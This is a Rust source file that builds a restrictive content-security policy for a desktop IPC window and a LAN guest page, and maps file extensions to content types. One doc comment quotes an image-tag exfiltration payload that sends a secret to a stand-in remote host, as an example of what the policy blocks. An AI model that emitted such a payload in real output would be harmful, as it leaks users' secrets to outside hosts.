// SPDX-License-Identifier: AGPL-3.0-or-later
// `content_type`: ported from commonwealth-ai shared/crates/host-kit/src/shell/files.rs@c663d4004
// `ConnectSrc`, `csp`: ported from commonwealth-ai shared/crates/sovereign-contracts/src/egress.rs@c663d4004
//! An app the group carries (v1ui-shelf (a)): its two forked pieces, as
//! upstream has them, before they change here.
#![expect(dead_code, reason = "ported unchanged; the carried path uses them from the next commit")]

use std::path::Path;

/// Where a served page may connect to — the ONE difference between the two
/// surfaces that serve a person HTML (ROOT_CAUSE_FIXES B2).
///
/// The base directives are one builder (`csp`): both surfaces want the same
/// restraint. What they want DIFFERENTLY is exactly one directive, so that
/// difference is a parameter here rather than a second policy to drift
/// (one decider; and a merged union of both would loosen both surfaces):
///
/// - [`ConnectSrc::Ipc`] — the desktop's mesh-app window: the gated Tauri
///   bridge and nothing else. `'self'` is deliberately absent: the window's
///   documented rule is that the only path to the host is the bridge, and
///   `connect-src 'self'` would hand every bundled app same-origin fetch.
/// - [`ConnectSrc::SameOrigin`] — the LAN guest door: pages fetch their own
///   host's API and nothing else. `ipc:` is deliberately absent: in Chrome
///   and Firefox `*.localhost` resolves to the LOOKER's own loopback, so IPC
///   origins on a stranger's page point at the stranger's own machine —
///   a phish-shaped hole, not a capability.
///
/// Both close the exfiltration class a rendered answer opens
/// (`<img src=https://x/?q=SECRET>` and kin): no remote origin in any
/// directive, `object-src 'none'`, `base-uri 'self'`, `form-action 'none'`,
/// no inline/eval scripts.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConnectSrc {
    /// The desktop's `window.meshApp` IPC scheme (macOS/Linux custom scheme,
    /// and the Windows/Android http form).
    Ipc,
    /// The serving origin's own API — the guest door's pages.
    SameOrigin,
}

/// The one content-security-policy builder for every surface that serves a
/// person HTML. Set by the door's router as a response layer (every
/// door-served response — refusals and proxied app responses included — and
/// appended, so an app's own stricter policy still counts) and by the
/// desktop's `meshapp_open`. The census over the door is
/// `sovereign-daemon/src/tests/guest_door.rs::every_door_served_response_carries_the_csp`.
pub fn csp(connect: ConnectSrc) -> String {
    let src = match connect {
        ConnectSrc::Ipc => "ipc: http://ipc.localhost",
        ConnectSrc::SameOrigin => "'self'",
    };
    format!(
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; \
         img-src 'self' data:; connect-src {src}; object-src 'none'; \
         base-uri 'self'; form-action 'none'"
    )
}

fn content_type(file: &Path) -> &'static str {
    match file.extension().and_then(|e| e.to_str()) {
        Some("html") => "text/html; charset=utf-8",
        Some("js") => "text/javascript; charset=utf-8",
        Some("css") => "text/css; charset=utf-8",
        Some("json") => "application/json",
        Some("svg") => "image/svg+xml",
        Some("woff2") => "font/woff2",
        _ => "application/octet-stream",
    }
}
